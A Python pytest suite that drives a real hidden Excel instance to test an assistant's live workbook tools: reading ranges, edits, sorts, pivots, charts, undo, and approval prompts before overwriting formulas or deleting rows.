"""Live Excel, against the REAL Excel on this PC (v1.466.0).

Skipped unless ``IJ_LIVE_EXCEL=1`` (and Windows with Excel): GitHub's runners
have no Excel. It starts its OWN hidden Excel, names its scratch workbook by
full path in every request (so another Excel the user has open is never
touched), and ends only the process it started.

Every check reads the workbook back through this test's own handle to Excel,
never through the worker's answer alone.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import time
from pathlib import Path

import pytest

pytestmark = [
    pytest.mark.skipif(sys.platform != "win32", reason="Excel on Windows only"),
    pytest.mark.skipif(os.environ.get("IJ_LIVE_EXCEL") != "1", reason="set IJ_LIVE_EXCEL=1 to drive the real Excel"),
    pytest.mark.timeout(240),
]


def ask(request: dict, timeout: float = 60) -> dict:
    r = subprocess.run(
        [sys.executable, "-m", "iron_jarvis.excel_worker"],
        input=json.dumps(request).encode("utf-8"), capture_output=True, timeout=timeout,
    )
    assert r.returncode == 0, r.stderr.decode("utf-8", "replace")[-2000:]
    return json.loads(r.stdout.decode("utf-8"))


@pytest.fixture(scope="module", autouse=True)
def _the_child_may_run():
    """The suite keeps the child off (conftest); these tests are what it is for."""
    from iron_jarvis.documents import excel_live as L

    old = os.environ.pop(L.OFF_ENV, None)
    try:
        yield
    finally:
        if old is not None:
            os.environ[L.OFF_ENV] = old


@pytest.fixture(scope="module")
def excel(tmp_path_factory):
    import pythoncom
    import win32com.client as wc
    import win32process

    pythoncom.CoInitialize()
    app = wc.DispatchEx("Excel.Application")
    pid = win32process.GetWindowThreadProcessId(app.Hwnd)[1]
    app.Visible = False
    app.DisplayAlerts = False
    app.IgnoreRemoteRequests = True  # a file the user double-clicks must not open in here
    try:
        yield app
    finally:
        try:
            for wb in list(app.Workbooks):
                wb.Close(False)
            app.IgnoreRemoteRequests = False
            app.Quit()
        except Exception:  # noqa: BLE001
            pass
        time.sleep(1.0)
        import psutil

        if psutil.pid_exists(pid):
            try:
                p = psutil.Process(pid)
                if p.name().lower() == "excel.exe":
                    p.kill()
            except Exception:  # noqa: BLE001
                pass


@pytest.fixture()
def book(excel, tmp_path):
    """A fresh saved workbook: Data (a small ledger) and Notes."""
    wb = excel.Workbooks.Add()
    ws = wb.Worksheets(1)
    ws.Name = "Data"
    rows = (
        ("Region", "Item", "Qty", "Price", "Total"),
        ("East", "Pens", 10, 2.5, "=C2*D2"),
        ("West", "Paper", 4, 12, "=C3*D3"),
        ("East", "Ink", 7, 30, "=C4*D4"),
        ("North", "Pens", 2, 2.5, "=C5*D5"),
        ("West", "Ink", 1, 30, "=C6*D6"),
        ("", "", "", "Sum", "=SUM(E2:E6)"),
    )
    ws.Range("A1:E7").Formula = rows
    wb.Worksheets.Add(None, ws).Name = "Notes"
    ws.Activate()
    path = tmp_path / "Live Book.xlsx"
    wb.SaveAs(str(path))
    try:
        yield wb, str(path)
    finally:
        try:
            wb.Close(False)
        except Exception:  # noqa: BLE001
            pass


def _apply(path: str, ops: list, tmp_path: Path, **kw) -> dict:
    undo = tmp_path / f"undo-{time.time_ns()}.jsonl"
    out = ask({"op": "apply", "workbook": path, "ops": ops, "undo_path": str(undo), **kw})
    out["_undo"] = str(undo)
    return out


def _f(wb, sheet: str, rng: str):
    v = wb.Worksheets(sheet).Range(rng).Formula
    return [list(r) for r in v] if isinstance(v, tuple) else v


def _v(wb, sheet: str, cell: str):
    return wb.Worksheets(sheet).Range(cell).Value


# ------------------------------------------------------------------- looking --


def test_look_lists_what_is_open_and_reads_a_range(book):
    wb, path = book
    out = ask({"op": "look", "workbook": path, "sheet": "Data", "range": "A1:E7"})
    assert out["ok"] and out["excel_open"]
    mine = next(b for b in out["workbooks"] if b["path"].lower() == path.lower())
    assert [s["name"] for s in mine["sheets"]] == ["Data", "Notes"]
    assert mine["sheets"][0]["used"] == "A1:E7" and mine["saved"] is True
    rng = out["range"]
    assert rng["sheet"] == "Data" and rng["address"] == "A1:E7" and not rng["truncated"]
    assert rng["rows"][1] == ["East", "Pens", 10, 2.5, 25]
    assert rng["rows"][6][4] == 25 + 48 + 210 + 5 + 30
    assert rng["formulas"]["E2"] == "=C2*D2" and rng["formulas"]["E7"] == "=SUM(E2:E6)"
    assert "A1" not in rng["formulas"]


def test_look_shows_errors_and_dates_as_text_and_cuts_a_big_range(book):
    wb, path = book
    ws = wb.Worksheets("Notes")
    ws.Range("A1").Formula = "=1/0"
    ws.Range("A2").Formula = "=DATE(2026,11,10)"
    ws.Range("A2").NumberFormat = "yyyy-mm-dd"
    ws.Range("A3").Formula = "=NA()"
    ws.Range("B1:B400").Value = 1
    out = ask({"op": "look", "workbook": path, "sheet": "Notes", "range": "A1:B400", "max_cells": 20})
    rng = out["range"]
    assert rng["rows"][0][0] == "#DIV/0!" and rng["rows"][1][0] == "2026-11-10" and rng["rows"][2][0] == "#N/A"
    assert rng["truncated"] and rng["total_rows"] == 400 and len(rng["rows"]) == 10


def test_a_workbook_that_is_not_open_is_refused_by_name(book):
    out = ask({"op": "look", "workbook": "No Such Book.xlsx", "range": "A1"})
    assert not out["ok"] and out["code"] == "no_such_workbook" and "Live Book.xlsx" in out["error"]


def test_snapshot_copies_without_touching_the_workbooks_saved_state(book, tmp_path):
    wb, path = book
    wb.Worksheets("Data").Range("C2").Value = 11  # unsaved change
    assert wb.Saved is False
    copy = tmp_path / "snap.xlsx"
    out = ask({"op": "snapshot", "workbook": path, "path": str(copy)})
    assert out["ok"] and copy.is_file()
    assert wb.Saved is False and wb.FullName.lower() == path.lower()
    from openpyxl import load_workbook

    snap = load_workbook(copy, data_only=True)
    assert snap["Data"]["C2"].value == 11 and snap["Data"]["E2"].value == 27.5  # the unsaved change, calculated


# ------------------------------------------------------------- cell changes --


def test_set_writes_values_formulas_and_blocks_and_lists_each_change(book, tmp_path):
    wb, path = book
    out = _apply(path, [
        {"op": "set", "sheet": "Data", "cell": "D2", "value": 3},
        {"op": "set", "sheet": "Data", "cell": "F1", "value": "Tax"},
        {"op": "set", "sheet": "Data", "cell": "F2:F6", "formula": "=E2*0.07", "number_format": "0.00"},
        {"op": "set", "sheet": "Notes", "cell": "A1", "values": [["k", "v"], ["rate", 0.07], ["note", "=1+1"]]},
    ], tmp_path)
    assert out["ok"], out
    assert _v(wb, "Data", "D2") == 3 and _v(wb, "Data", "E2") == 30
    assert _f(wb, "Data", "F2:F6") == [["=E2*0.07"], ["=E3*0.07"], ["=E4*0.07"], ["=E5*0.07"], ["=E6*0.07"]]
    assert wb.Worksheets("Data").Range("F3").NumberFormat == "0.00"
    assert _v(wb, "Notes", "B3") == 2 and _v(wb, "Notes", "A2") == "rate"
    by_cell = {(c["sheet"], c["cell"]): c for c in out["changes"]}
    assert by_cell[("Data", "D2")]["before"] == 2.5 and by_cell[("Data", "D2")]["after"] == 3
    assert by_cell[("Data", "F4")]["after_formula"] == "=E4*0.07"
    assert out["changed_cells"] == 1 + 1 + 5 + 6
    assert out["steps"][0]["overwrites"] == 1 and out["steps"][1]["overwrites"] == 0
    assert out["new_errors"] == [] and out["saved"] is False


def test_plan_counts_what_would_be_overwritten_and_changes_nothing(book):
    wb, path = book
    out = ask({"op": "plan", "workbook": path, "ops": [
        {"op": "set", "sheet": "Data", "cell": "E2:E6", "value": 0},
        {"op": "set", "sheet": "Data", "cell": "H1", "value": "new"},
        {"op": "delete_rows", "sheet": "Data", "at": 3, "count": 2},
    ]})
    assert out["ok"], out
    assert out["overwrites"] == 5 and out["formulas_lost"] == 5
    assert out["destructive"] and "delete rows 3:4 on Data" in out["destructive"][0]
    assert _f(wb, "Data", "E2") == "=C2*D2" and wb.Saved is True


def test_a_failing_step_puts_back_everything_before_it(book, tmp_path):
    wb, path = book
    out = _apply(path, [
        {"op": "set", "sheet": "Data", "cell": "C2", "value": 99},
        {"op": "add_sheet", "name": "Extra"},
        {"op": "set", "sheet": "Data", "cell": "A1", "number_format": "0.00", "fill": "FFF2CC"},
        {"op": "rename_sheet", "sheet": "Notes", "to": "Data"},  # refused in the check: a sheet called Data exists
    ], tmp_path)
    assert not out["ok"] and "step 4" in out["error"]
    assert _v(wb, "Data", "C2") == 10 and [s.Name for s in wb.Worksheets] == ["Data", "Notes"]


def test_a_step_excel_itself_refuses_rolls_the_batch_back(book, tmp_path):
    wb, path = book
    out = _apply(path, [
        {"op": "set", "sheet": "Data", "cell": "C2", "value": 99},
        {"op": "add_sheet", "name": "Extra"},
        {"op": "filter", "sheet": "Data", "range": "A1:E6", "column": "Qty", "criteria": ">3"},
        {"op": "pivot_edit", "sheet": "Data", "rows": ["Region"]},  # no pivot table on Data: refused when it runs
    ], tmp_path)
    assert not out["ok"], out
    assert "Nothing was changed" in out["error"] or out["code"] == "no_pivot"
    assert _v(wb, "Data", "C2") == 10 and [s.Name for s in wb.Worksheets] == ["Data", "Notes"]
    assert not wb.Worksheets("Data").AutoFilterMode


def test_undo_puts_cells_and_formats_back_and_leaves_a_cell_changed_since(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [
        {"op": "set", "sheet": "Data", "cell": "C2:C4", "values": [[100], [200], [300]]},
        {"op": "set", "sheet": "Data", "cell": "E7", "value": 5, "bold": True, "fill": "FFF2CC", "number_format": "$#,##0.00"},
    ], tmp_path)
    assert out["ok"], out
    assert ws.Range("E7").Font.Bold is True and _v(wb, "Data", "E7") == 5
    ws.Range("C3").Value = 222  # the user changes one of the cells afterwards
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"], back
    assert _v(wb, "Data", "C2") == 10 and _v(wb, "Data", "C4") == 7
    assert _v(wb, "Data", "C3") == 222, "a cell changed since is left alone"
    assert any("C3" in line and "changed again since" in line for line in back["left"])
    assert _f(wb, "Data", "E7") == "=SUM(E2:E6)" and ws.Range("E7").Font.Bold is False
    assert ws.Range("E7").NumberFormat == "General" and ws.Range("E7").Interior.Pattern == -4142


def test_a_change_that_breaks_a_formula_is_reported(book, tmp_path):
    wb, path = book
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "C3", "value": "four"}], tmp_path)
    assert out["ok"]
    assert "Data!E3" in out["new_errors"] and "Data!E7" in out["new_errors"]


# ----------------------------------------------------------------- structure --


def test_insert_rows_moves_formulas_and_undo_takes_them_out_again(book, tmp_path):
    wb, path = book
    out = _apply(path, [{"op": "insert_rows", "sheet": "Data", "at": 3, "count": 2}], tmp_path)
    assert out["ok"], out
    assert _f(wb, "Data", "E9") == "=SUM(E2:E8)" and _v(wb, "Data", "A5") == "West"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"]
    assert _f(wb, "Data", "E7") == "=SUM(E2:E6)" and _v(wb, "Data", "A3") == "West"


def test_inserted_rows_the_user_filled_in_are_kept_on_undo(book, tmp_path):
    wb, path = book
    out = _apply(path, [{"op": "insert_rows", "sheet": "Data", "at": 3}], tmp_path)
    wb.Worksheets("Data").Range("A3").Value = "typed since"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and any("filled in since" in line for line in back["left"])
    assert _v(wb, "Data", "A3") == "typed since"


def test_deleting_rows_keeps_a_copy_and_says_it_cannot_be_put_back(book, tmp_path):
    wb, path = book
    copy = tmp_path / "before.xlsx"
    out = _apply(path, [{"op": "delete_rows", "sheet": "Data", "at": 3, "count": 2}], tmp_path, copy_path=str(copy))
    assert out["ok"], out
    assert _v(wb, "Data", "A3") == "North" and out["destructive"] and out["copy"] == str(copy)
    from openpyxl import load_workbook

    assert load_workbook(copy)["Data"]["A3"].value == "West", "the copy is the workbook as it was"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and any("cannot be put back" in line for line in back["left"])


def test_sort_and_filter_and_their_undo(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "A1:E6", "by": [{"column": "Total", "order": "desc"}]}], tmp_path)
    assert out["ok"], out
    assert [ws.Range(f"B{r}").Value for r in range(2, 7)] == ["Ink", "Paper", "Ink", "Pens", "Pens"]
    assert _v(wb, "Data", "E2") == 210 and _v(wb, "Data", "E7") == 318
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"]
    assert [ws.Range(f"A{r}").Value for r in range(2, 7)] == ["East", "West", "East", "North", "West"]
    out = _apply(path, [{"op": "filter", "sheet": "Data", "range": "A1:E6", "column": "Region", "values": ["East"]}], tmp_path)
    assert out["ok"], out
    assert ws.Rows(3).Hidden is True and ws.Rows(2).Hidden is False
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and ws.Rows(3).Hidden is False and not ws.AutoFilterMode


def test_sheets_can_be_added_and_renamed_and_put_back(book, tmp_path):
    wb, path = book
    out = _apply(path, [{"op": "add_sheet", "name": "Summary"}, {"op": "rename_sheet", "sheet": "Notes", "to": "Memo"},
                        {"op": "set", "sheet": "Summary", "cell": "A1", "formula": "=Data!E7"}], tmp_path)
    assert out["ok"], out
    assert [s.Name for s in wb.Worksheets] == ["Data", "Memo", "Summary"] and _v(wb, "Summary", "A1") == 318
    assert wb.ActiveSheet.Name == "Data", "the user's sheet stays in front"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and [s.Name for s in wb.Worksheets] == ["Data", "Notes"]


# ------------------------------------------------------- Excel's own features --


def test_colour_rules_and_dropdowns_and_their_undo(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [
        {"op": "conditional_format", "sheet": "Data", "range": "E2:E6", "rule": "greater", "value": 100, "fill": "C6EFCE"},
        {"op": "conditional_format", "sheet": "Data", "range": "C2:C6", "rule": "data_bar"},
        {"op": "validation", "sheet": "Data", "range": "A2:A6", "list": ["East", "West", "North", "South"]},
        {"op": "validation", "sheet": "Data", "range": "C2:C6", "type": "whole", "min": 0, "max": 1000, "message": "0 to 1000"},
    ], tmp_path)
    assert out["ok"], out
    assert ws.Range("E2:E6").FormatConditions.Count == 1 and ws.Range("C2:C6").FormatConditions.Count == 1
    assert ws.Range("E4").DisplayFormat.Interior.Color == 0xC6 + 0xEF * 256 + 0xCE * 65536  # red C6, green EF, blue CE
    assert ws.Range("A2").Validation.Type == 3 and ws.Range("A2").Validation.Formula1 == "East,West,North,South"
    assert ws.Range("C2").Validation.Type == 1 and ws.Range("C2").Validation.ErrorMessage == "0 to 1000"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert ws.Range("E2:E6").FormatConditions.Count == 0 and ws.Range("C2:C6").FormatConditions.Count == 0
    with pytest.raises(Exception):
        ws.Range("A2").Validation.Type  # noqa: B018 — Excel raises when there is no rule


def test_a_chart_is_added_changed_and_removed_by_undo(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [{"op": "chart", "sheet": "Data", "data": "B1:C6", "type": "column", "title": "Qty by item", "name": "QtyChart"}], tmp_path)
    assert out["ok"], out
    assert ws.ChartObjects().Count == 1 and ws.ChartObjects("QtyChart").Chart.ChartTitle.Text == "Qty by item"
    edit = _apply(path, [{"op": "chart_edit", "sheet": "Data", "name": "QtyChart", "type": "bar", "title": "Units", "y_title": "Count", "legend": False}], tmp_path)
    assert edit["ok"], edit
    chart = ws.ChartObjects("QtyChart").Chart
    assert chart.ChartType == 57 and chart.ChartTitle.Text == "Units" and chart.HasLegend is False
    back = ask({"op": "restore", "undo_path": edit["_undo"]})
    assert back["ok"] and chart.ChartType == 51 and chart.ChartTitle.Text == "Qty by item"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and ws.ChartObjects().Count == 0


def test_a_pivot_table_is_built_changed_filtered_and_removed_by_undo(book, tmp_path):
    wb, path = book
    out = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Region"], "values": [{"field": "Total", "func": "sum"}], "name": "ByRegion"}], tmp_path)
    assert out["ok"], out
    ws = wb.Worksheets("Pivot")
    pt = ws.PivotTables("ByRegion")
    got = {str(ws.Cells(r, 1).Value): ws.Cells(r, 2).Value for r in range(4, 8)}
    assert got["East"] == 235 and got["West"] == 78 and got["North"] == 5 and got["Grand Total"] == 318
    edit = _apply(path, [{"op": "pivot_edit", "sheet": "Pivot", "name": "ByRegion", "rows": ["Item"],
                          "values": [{"field": "Qty", "func": "sum"}, {"field": "Total", "func": "average"}],
                          "show": {"Item": ["Ink", "Pens"]}}], tmp_path)
    assert edit["ok"], edit
    assert [f.Name for f in pt.RowFields if f.Name not in ("Data", "Values")] == ["Item"]
    assert pt.DataFields.Count == 2
    assert [i.Name for i in pt.PivotFields("Item").PivotItems() if i.Visible] == ["Ink", "Pens"]
    back = ask({"op": "restore", "undo_path": edit["_undo"]})
    assert back["ok"] and not back["left"], back
    assert [f.Name for f in pt.RowFields if f.Name not in ("Data", "Values")] == ["Region"] and pt.DataFields.Count == 1
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and [s.Name for s in wb.Worksheets] == ["Data", "Notes"]


def test_a_pivot_naming_a_missing_column_is_refused_before_anything_changes(book, tmp_path):
    wb, path = book
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "C2", "value": 50},
                        {"op": "pivot", "source": "Data!A1:E6", "rows": ["Country"], "values": ["Total"]}], tmp_path)
    assert not out["ok"] and "Country" in out["error"] and "Region" in out["error"]
    assert _v(wb, "Data", "C2") == 10


def test_names_tables_notes_print_layout_widths_and_freeze(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    width = ws.Columns(1).ColumnWidth
    out = _apply(path, [
        {"op": "name", "name": "Totals", "refers_to": "Data!$E$2:$E$6"},
        {"op": "table", "sheet": "Data", "range": "A1:E6", "name": "Ledger"},
        {"op": "note", "sheet": "Data", "cell": "E7", "text": "Checked against the ledger"},
        {"op": "print_setup", "sheet": "Data", "orientation": "landscape", "fit_width": 1, "print_area": "A1:E7", "title_rows": "1:1"},
        {"op": "column_width", "sheet": "Data", "columns": "A:B", "width": 22},
        {"op": "freeze", "sheet": "Data", "cell": "B2"},
        {"op": "set", "sheet": "Notes", "cell": "A1", "formula": "=SUM(Totals)"},
    ], tmp_path)
    assert out["ok"], out
    assert _v(wb, "Notes", "A1") == 318 and ws.ListObjects("Ledger").Range.Address == "$A$1:$E$6"
    assert ws.Range("E7").Comment.Text() == "Checked against the ledger"
    assert ws.PageSetup.Orientation == 2 and ws.PageSetup.PrintArea == "$A$1:$E$7" and ws.PageSetup.PrintTitleRows == "$1:$1"
    assert ws.Columns(1).ColumnWidth == 22
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert ws.ListObjects.Count == 0 and ws.Range("E7").Comment is None
    assert ws.PageSetup.Orientation == 1 and ws.PageSetup.PrintArea == "" and ws.Columns(1).ColumnWidth == width
    assert all(n.Name != "Totals" for n in wb.Names)


def test_goto_shows_the_cell(book):
    wb, path = book
    out = ask({"op": "goto", "workbook": path, "sheet": "Notes", "cell": "C5"})
    assert out["ok"] and out["address"] == "C5"
    assert wb.ActiveSheet.Name == "Notes" and wb.Application.ActiveCell.Address == "$C$5"


# ------------------------------------------------- the tools, on the real Excel --


def _ctx(home: Path):
    from types import SimpleNamespace

    from iron_jarvis.tools.base import ToolContext

    return ToolContext(workspace=home / "ws", session_id="chat", agent_run_id="r",
                       config=SimpleNamespace(home=home), event_bus=None, engine=None)


def _tools():
    from iron_jarvis.documents.excel_live import ExcelLiveEditTool, ExcelLiveLookTool

    return ExcelLiveLookTool(), ExcelLiveEditTool()


def test_the_look_tool_reads_the_open_workbook_and_its_map(book, tmp_path):
    import asyncio

    wb, path = book
    look, _edit = _tools()
    ctx = _ctx(tmp_path / "home")
    res = asyncio.run(look.execute({"workbook": path, "sheet": "Data", "range": "used"}, ctx))
    assert res.ok, res.error
    assert "open workbook: Live Book.xlsx" in res.output and "sheet Data: A1:E7" in res.output
    assert "2\tEast\tPens\t10\t2.5\t25" in res.output
    assert "E2:E6: =C2*D2 (the same down the column)" in res.output and "E7: =SUM(E2:E6)" in res.output
    wb.Worksheets("Data").Range("E7").Formula = "=SUM(E2:E4)"  # unsaved, and now two rows short
    res = asyncio.run(look.execute({"workbook": path, "map": True}, ctx))
    assert res.ok, res.error
    assert "not saved yet" in res.output and "stops short" in res.output and "E5:E6" in res.output
    assert not any((tmp_path / "home" / "excel-live" / "snap").iterdir()), "the reading copy is removed"


def test_the_edit_tool_changes_excel_and_its_undo_puts_it_back(book, tmp_path):
    import asyncio

    wb, path = book
    _look, edit = _tools()
    ctx = _ctx(tmp_path / "home")
    args = {"workbook": path, "ops": [
        {"op": "set", "sheet": "Data", "cell": "D2", "value": 3},
        {"op": "set", "sheet": "Data", "cell": "F2:F6", "formula": "=E2*0.07"},
    ]}

    async def go():
        assert await edit.spend_check(args, ctx) is None  # one cell of data replaced: the ordinary approval
        undo = await edit.capture_undo(args, ctx)
        res = await edit.execute(args, ctx)
        return undo, res

    undo, res = asyncio.run(go())
    assert res.ok, res.error
    assert _v(wb, "Data", "D2") == 3 and _v(wb, "Data", "F2") == 2.1
    assert "Data!D2: 2.5 -> 3" in res.output and "NOT saved" in res.output
    card = res.data["excel_change"]
    assert card["label"] == "Live Book.xlsx" and "6 cells on Data" in card["new"] and card["change_id"] in undo["pre_inline"]
    back = asyncio.run(edit.revert(undo, ctx))
    assert back.ok and "back to how it was" in back.output
    assert _v(wb, "Data", "D2") == 2.5 and _v(wb, "Data", "F2") is None


def test_replacing_formulas_or_deleting_rows_is_carded_first(book, tmp_path):
    import asyncio

    wb, path = book
    _look, edit = _tools()
    ctx = _ctx(tmp_path / "home")
    over = asyncio.run(edit.spend_check({"workbook": path, "ops": [{"op": "set", "sheet": "Data", "cell": "E2:E6", "value": 0}]}, ctx))
    assert over is not None and over.ask and not over.once_only and over.dont_ask_skips
    assert "replaces 5 cells" in over.words and "5 of them formulas" in over.words
    gone_args = {"workbook": path, "ops": [{"op": "delete_rows", "sheet": "Data", "at": 3, "count": 2}]}
    gone = asyncio.run(edit.spend_check(gone_args, ctx))
    assert gone is not None and gone.ask and gone.once_only and not gone.dont_ask_skips
    assert "cannot be undone" in gone.words and "delete rows 3:4 on Data" in gone.words
    res = asyncio.run(edit.execute(gone_args, ctx))
    assert res.ok and res.data["copy"] and Path(res.data["copy"]).is_file()
    assert _v(wb, "Data", "A3") == "North"


def test_a_file_tool_reads_the_open_workbook_through_a_live_path(book, tmp_path):
    import asyncio

    from iron_jarvis.documents.excel_tools import ExcelQueryTool, ExcelReadTool

    wb, path = book
    wb.Worksheets("Data").Range("C2").Value = 1000  # unsaved: only Excel knows
    ctx = _ctx(tmp_path / "home")
    res = asyncio.run(ExcelQueryTool().execute({"path": "live:Live Book.xlsx", "sheet": "Data", "op": "group", "group_by": "Region", "agg": "sum", "column": "Total"}, ctx))
    assert res.ok, res.error
    assert "2,710" in res.output or "2710" in res.output, res.output  # East: 1000*2.5 + 210
    # By its full path, never "the workbook in front": on a PC where the user has
    # their own Excel open, "in front" is THEIR workbook (the review's rule).
    res = asyncio.run(ExcelReadTool().execute({"path": "live:" + path, "sheet": "Data", "range": "A1:E3"}, ctx))
    assert res.ok and '["East", "Pens", 1000, 2.5, 2500]' in res.output, res.output  # the unsaved value, calculated


def test_a_change_must_say_its_sheet_and_a_range_may_carry_it(book, tmp_path):
    """The live trial: a model that had just read Sales sorted the sheet in
    front instead, because a step with no sheet meant "the active one"."""
    wb, path = book
    out = _apply(path, [{"op": "sort", "range": "A1:E6", "by": ["Total"]}], tmp_path)
    assert not out["ok"] and "say which sheet" in out["error"] and "Data, Notes" in out["error"]
    assert [wb.Worksheets("Data").Range(f"A{r}").Value for r in (2, 3)] == ["East", "West"]
    out = _apply(path, [{"op": "sort", "range": "Data!A1:E6", "by": [{"column": "Total", "order": "desc"}]}], tmp_path)
    assert out["ok"] and _v(wb, "Data", "E2") == 210
    out = _apply(path, [{"op": "set", "cell": "A1", "value": "x"}, {"op": "set", "cell": "A2", "value": "y"}], tmp_path, sheet="Notes")
    assert out["ok"] and _v(wb, "Notes", "A2") == "y", "one sheet for the whole call"


def test_a_step_excel_refuses_says_plainly_that_nothing_changed(book, tmp_path):
    wb, path = book
    made = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Region"], "values": ["Total"], "dest_sheet": "Data", "dest_cell": "H1"}], tmp_path)
    assert made["ok"], made
    out = _apply(path, [{"op": "delete_rows", "sheet": "Data", "at": 2, "count": 2}], tmp_path)
    assert not out["ok"] and out.get("unchanged") and "PivotTable" in out["error"]
    assert _v(wb, "Data", "A2") == "East", "the rows are still there"


# ------------------------------------------------------------ the review's pins --
# Each of these was RED on the first cut (the reviewer drove the real Excel).


def _fills(ws, rows, col=1):
    return [int(ws.Cells(r, col).Interior.ColorIndex) for r in rows]


def test_undo_keeps_text_that_looks_like_a_number_or_a_date(book, tmp_path):
    """An account number kept as text ("00123") came back from Undo as the
    number 123, and "1/2" as a date."""
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("G2").Formula = "'00123"
    ws.Range("G3").Formula = "'1/2"
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "G2:G3", "value": "x"}], tmp_path)
    assert out["ok"], out
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert _v(wb, "Data", "G2") == "00123" and _v(wb, "Data", "G3") == "1/2"
    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "G1:G3", "by": "G", "header": False}], tmp_path)
    assert out["ok"], out
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and _v(wb, "Data", "G2") == "00123" and _v(wb, "Data", "G3") == "1/2"


def test_undo_puts_back_the_number_format_excel_changed_by_itself(book, tmp_path):
    """Writing "2026-01-31" or "50%" makes Excel change the cell's format; Undo
    put the 5 back and left it showing as 1/5/1900 (or 500%)."""
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("I2:I3").Value = 5
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "I2", "value": "2026-01-31"},
                        {"op": "set", "sheet": "Data", "cell": "I3", "value": "50%"}], tmp_path)
    assert out["ok"] and ws.Range("I2").NumberFormat != "General"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert ws.Range("I2").NumberFormat == "General" and ws.Range("I3").NumberFormat == "General"
    assert ws.Range("I2").Text == "5" and ws.Range("I3").Text == "5"


def test_sort_undo_puts_colours_and_notes_back_with_their_rows(book, tmp_path):
    """A sort moves a row's fill and its note with the row; Undo moved the
    values back and left the yellow row and the note on another client's row."""
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("A2:E2").Interior.Color = 65535
    ws.Range("A2").AddComment("about East Pens")
    before = _fills(ws, range(2, 7))
    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "A1:E6", "by": [{"column": "Qty", "order": "asc"}]}], tmp_path)
    assert out["ok"] and _fills(ws, range(2, 7)) != before, "the sort moved the fill"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert _v(wb, "Data", "B2") == "Pens" and _fills(ws, range(2, 7)) == before
    assert ws.Range("A2").Comment is not None and ws.Range("A2").Comment.Text() == "about East Pens"
    assert all(ws.Cells(r, 1).Comment is None for r in range(3, 7))


def test_a_sort_that_leaves_out_the_columns_beside_it_is_refused(book, tmp_path):
    """Sorting A:C of a five-column ledger moved three columns and left the
    prices and totals where they were: every row mixed up, with no warning
    (Excel's own window asks "expand the selection?")."""
    wb, path = book
    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "A1:C6", "by": "Qty"}], tmp_path)
    assert not out["ok"] and out["code"] == "partial_sort" and "D" in out["error"] and "alone" in out["error"], out
    assert [_v(wb, "Data", f"C{r}") for r in range(2, 7)] == [10, 4, 7, 2, 1]
    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "A1:C6", "by": "Qty", "alone": True}], tmp_path)
    assert out["ok"], "said outright, a part of the table can be sorted by itself"


def test_a_refused_pivot_never_clears_a_pivot_table_that_was_already_there(book, tmp_path):
    """A second pivot under a name already used on that sheet is refused by
    Excel; putting the step "back" cleared EVERY pivot table on the sheet,
    the user's own included, and then said nothing was changed."""
    wb, path = book
    made = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Region"], "values": ["Qty"], "dest_sheet": "Notes", "dest_cell": "A3", "name": "Mine"}], tmp_path)
    assert made["ok"], made
    notes = wb.Worksheets("Notes")
    out = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Item"], "values": ["Qty"], "dest_sheet": "Notes", "dest_cell": "T3", "name": "Mine"}], tmp_path)
    assert not out["ok"], out
    assert [p.Name for p in notes.PivotTables()] == ["Mine"] and notes.Range("A4").Value == "East"
    # ...and one Excel refuses AFTER it made the new pivot table (a value named
    # like a column): only the new one is taken away again.
    out = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Item"], "values": [{"field": "Qty", "caption": "Qty"}],
                        "dest_sheet": "Notes", "dest_cell": "T3"}], tmp_path)
    assert not out["ok"] and out.get("unchanged"), out
    assert [p.Name for p in notes.PivotTables()] == ["Mine"] and notes.Range("A4").Value == "East"
    assert notes.Range("T3").Value is None


def test_a_sheet_excel_will_not_name_is_not_left_behind(book, tmp_path):
    """"History" is a name Excel keeps for itself: the sheet was added, the
    naming refused, and "nothing was changed" left a stray Sheet3."""
    wb, path = book
    out = _apply(path, [{"op": "add_sheet", "name": "History"}], tmp_path)
    assert not out["ok"] and out.get("unchanged"), out
    assert [s.Name for s in wb.Worksheets] == ["Data", "Notes"]
